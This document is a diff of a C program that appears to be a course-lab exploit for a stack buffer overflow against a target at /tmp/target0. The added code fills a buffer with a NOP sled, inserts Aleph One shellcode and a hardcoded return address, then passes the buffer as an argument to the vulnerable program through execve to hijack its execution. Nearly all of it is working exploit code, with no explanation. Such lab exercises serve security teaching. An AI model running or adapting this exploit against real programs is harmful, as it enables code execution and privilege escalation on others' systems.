@@ -5,8 +5,8 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-//#define TARGET "/tmp/target0"
-#define TARGET "./meet"
+#define TARGET "/tmp/target0"
+//#define TARGET "./meet"
 
 unsigned long get_sp(void)
 {
@@ -30,38 +30,59 @@ int main(void)
 {
 	char *args[3]; 
 	char *env[1];
+	unsigned char esp[4];
 	int index = 0;
 	int A1 = 203;
 	int A2 = 38;
 
-	char part1[203] = {"\x90"};
-	unsigned char part2[A2];
+	int shellLen = strlen(shellcodeAlephOne);
+	int bufferSize = 8 + A1 + 4*A2 + shellLen;
 
-	unsigned char *esp = getByteArrayFromLong(get_sp());
-	
-	for(int j = 0; j < 4*A2; j+=4)
+	char bufferPtr[bufferSize];
+
+	//int *bufPtr = (int *) bufferPtr;
+	//int esp = get_sp()-0x300;
+
+	//for(int j = 0; j < 400; j+=4)
+	//{
+	//	*bufPtr++ = esp;
+	//}
+
+//	esp = getByteArrayFromLong(get_sp() - 0x300);
+	esp[0] = 0x94;esp[1]=0xfb;esp[2]=0xff;esp[3]=0xbf;
+	for(int j = 0; j < bufferSize; j+=4) 
 	{
-		part2[j+0] = esp[3];
-		part2[j+1] = esp[2];
-		part2[j+2] = esp[1];
-		part2[j+3] = esp[0];
+		bufferPtr[j + 0] = esp[0];
+		bufferPtr[j + 1] = esp[1];
+		bufferPtr[j + 2] = esp[2];
+		bufferPtr[j + 3] = esp[3];
+		//printf("%i\n", j);
 	}
 
-	printf("Check: part 1 %s\n", part1);
-	printf("Check: part 2 %s\n", part2);
-	printf("Check: esp %s\n", esp);
-	char * str3 = (char *) malloc(1 + strlen(part1)+ strlen(part2)+ strlen(esp) );
+	for(int i = 0; i < A1;i++) 
+	{
+		bufferPtr[i] = 0x90;
+	}
+
+	for(int k = 0; k < shellLen; k++) 
+	{
+		bufferPtr[A1 + k] = shellcodeAlephOne[k];
+	}	
+
+	for (int i = 0; i < bufferSize; i++)
+	{
+//    		if (i > 0) printf(":");
+//    		printf("%hhX", bufferPtr[i]);
+	}
+
+//	printf("\n%s\n", bufferPtr);
+//	printf("\n");	
 	args[0] = TARGET;
-	strcpy(str3, part1);
-        strcat(str3, esp);
-	strcpy(str3, part2);
-	args[1] = str3; 
+	args[1] = bufferPtr; 
 	args[2] = NULL;
 
 	env[0] = NULL;
 	execve(TARGET, args, env);
-	printf("Check: %s", str3);
-	fprintf(stderr, "execve failed.\n");
 
 	return 0;
 }
